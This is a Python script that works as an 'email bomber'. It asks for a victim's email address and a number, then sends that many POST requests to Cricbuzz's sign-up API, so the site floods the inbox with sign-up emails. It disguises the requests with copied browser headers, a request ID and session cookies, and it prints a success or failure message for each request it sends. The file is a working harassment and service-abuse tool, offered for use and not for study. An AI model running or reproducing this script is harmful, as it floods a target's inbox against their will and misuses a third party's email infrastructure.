import requests
import time
from style.clear import clear
from style.logo import logo
import json
import ctypes

rs = "\033[0m"
d = '\033[38;2;50;100;255m'
g = "\033[32m"
r = "\033[31m"
t = time.strftime('%H:%M:%S')

async def bomb():
    await clear()
    await logo()    
    email = input(f"                                     {d}[{rs}Enter the Email Target{d}]{rs} > ")
    amount = int(input(f"                                     {d}[{rs}Enter the Amount to Send{d}]{rs} > "))
    
    url = 'https://m.cricbuzz.com/api/cbplus/auth/user/sign-up'
    payload = json.dumps({'username': email})
    headers = {
        'Reqable-Id': 'reqable-id-3ff5de3c-7a93-471c-8d3e-bff12c5f7431',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?1',
        'origin': 'https://m.cricbuzz.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://m.cricbuzz.com/premium-subscription/user/sign-up',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'priority': 'u=1, i',
        'Cookie': 'cbzads=BD|not_set|not_set|DHAKA; _ga=GA1.1.187876574.1717929040; pageVisit=5; _ga_83LXEV4P47=GS1.1.1717929039.1.1.1717929179.24.0.0'
    }
    await clear()
    await logo()
    count = 0
    for i in range(amount):
        response = requests.post(url, data=payload, headers=headers)
        count += 1
        if response.status_code == 200:
            print(f"                                     {d}[{rs}{t}{d}]{rs} {g}[+]{rs} Email sent successfully {g}[SUCCESS]{rs}")
        else:
            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Failed to send email {r}[FAILURE]{rs}")

    print(f"                                     {d}[{rs}{t}{d}]{rs} {g}[+]{rs} {count} emails sent successfully {g}[SUCCESS]{rs}")
